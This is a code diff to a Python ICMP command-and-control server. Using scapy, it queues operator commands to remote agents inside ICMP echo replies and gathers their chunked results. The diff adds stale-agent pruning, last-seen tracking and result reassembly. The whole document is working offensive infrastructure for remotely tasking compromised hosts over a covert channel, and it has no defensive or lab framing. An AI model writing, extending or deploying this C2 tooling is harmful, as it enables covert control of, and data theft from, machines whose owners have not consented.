@@ -1,12 +1,16 @@
 # c2_server.py
 from scapy.all import *
 import threading
+import time
+import os
 
-C2_IP = "192.168.1.100"  # Your C2 server IP
-MAX_CLIENTS = 20
-COMMANDS = {}   # agent_id -> list of queued commands
-RESULTS = {}    # agent_id -> list of received results
+C2_IP = "192.168.10.50"  # Your C2 server IP
+MAX_CLIENTS = 50
+COMMANDS = {}    # agent_id -> list of queued commands
+RESULTS = {}     # agent_id -> list of (seq, data) results
 ACTIVE_AGENTS = set()
+LAST_SEEN = {}   # agent_id -> last beacon timestamp
+INACTIVITY_TIMEOUT = 10  # seconds before agent considered stale
 
 lock = threading.Lock()
 
@@ -18,22 +22,31 @@ def handle_request(pkt):
         if len(fields) < 4:
             return
 
-        agent_id, msg_type, seq, data = fields
+        agent_id, msg_type, seq_str, data = fields
+        agent_id = agent_id.strip()
+        msg_type = msg_type.strip()
+        data = data.strip()
+        try:
+            seq = int(seq_str)
+        except:
+            seq = 0
 
         with lock:
             ACTIVE_AGENTS.add(agent_id)
+            LAST_SEEN[agent_id] = time.time()
 
             if msg_type == "BEACON":
-                cmd = COMMANDS.get(agent_id, [])
-                if cmd:
-                    next_cmd = cmd.pop(0)
+                # Send next queued command or NO_CMD
+                cmd_list = COMMANDS.get(agent_id, [])
+                if cmd_list:
+                    next_cmd = cmd_list.pop(0)
                     reply_payload = f"{agent_id}|CMD|0|{next_cmd}"
                 else:
                     reply_payload = f"{agent_id}|NO_CMD|0|"
                 send(IP(dst=pkt[IP].src)/ICMP(type=0)/reply_payload, verbose=0)
 
             elif msg_type == "RESULT":
-                RESULTS.setdefault(agent_id, []).append((int(seq), data))
+                RESULTS.setdefault(agent_id, []).append((seq, data))
                 reply_payload = f"{agent_id}|ACK|{seq}|"
                 send(IP(dst=pkt[IP].src)/ICMP(type=0)/reply_payload, verbose=0)
 
@@ -43,20 +56,34 @@ def operator_console():
         cmd = input("C2> ").strip()
         if cmd == "list":
             with lock:
+                now = time.time()
+                # Lazy prune stale agents
+                for agent in list(ACTIVE_AGENTS):
+                    if now - LAST_SEEN.get(agent, 0) > INACTIVITY_TIMEOUT:
+                        ACTIVE_AGENTS.remove(agent)
+                        LAST_SEEN.pop(agent, None)
+                        COMMANDS.pop(agent, None)
+                        RESULTS.pop(agent, None)
+                        print(f"[PRUNE] Removed stale agent {agent}")
+
                 if ACTIVE_AGENTS:
                     print("[*] Active agents:")
                     for agent in ACTIVE_AGENTS:
-                        print(f" - {agent}")
+                        age = int(now - LAST_SEEN.get(agent, now))
+                        print(f" - {agent} (last seen {age}s ago)")
                 else:
                     print("No active agents yet.")
+
         elif cmd.startswith("task "):
             try:
-                agent_id, command = cmd.split(" ", 2)[1:]
+                # Split only on first 2 spaces so command can have spaces
+                _, agent_id, command = cmd.split(" ", 2)
                 with lock:
                     COMMANDS.setdefault(agent_id, []).append(command)
                     print(f"[+] Queued command for {agent_id}: {command}")
-            except:
+            except Exception:
                 print("Usage: task <agent_id> <command>")
+
         elif cmd.startswith("results "):
             try:
                 agent_id = cmd.split(" ", 1)[1]
@@ -64,21 +91,30 @@ def operator_console():
                     chunks = sorted(RESULTS.get(agent_id, []))
                     if not chunks:
                         print(f"No results for {agent_id}")
-                    else:
-                        print(f"--- Results from {agent_id} ---")
-                        print("\n".join(chunk for _, chunk in chunks))
-                        print("-------------------------------")
-            except:
-                print("Usage: results <agent_id>")
+                        continue
+                    # Combine all chunks into a single string
+                    full_result = "".join(chunk for _, chunk in chunks)
+                    print(f"--- Results from {agent_id} ---")
+                    print(full_result)
+                    print("-------------------------------")
+                    # Clear after printing
+                    RESULTS[agent_id] = []
+            except Exception as e:
+                print("Usage: results <agent_id>", e)
+
         elif cmd == "help":
             print("Commands:")
             print("  list                 - List active agents")
             print("  task <id> <cmd>      - Queue a command for an agent")
             print("  results <id>         - Show results from an agent")
             print("  exit                 - Stop the server")
+
         elif cmd == "exit":
             print("[*] Stopping server...")
             os._exit(0)
+
+        else:
+            print("Unknown command. Type 'help'.")
 
 def start_c2():
     print("[*] Starting ICMP C2 server...")
@@ -87,3 +123,5 @@ def start_c2():
 
 if __name__ == "__main__":
     start_c2()
+
+
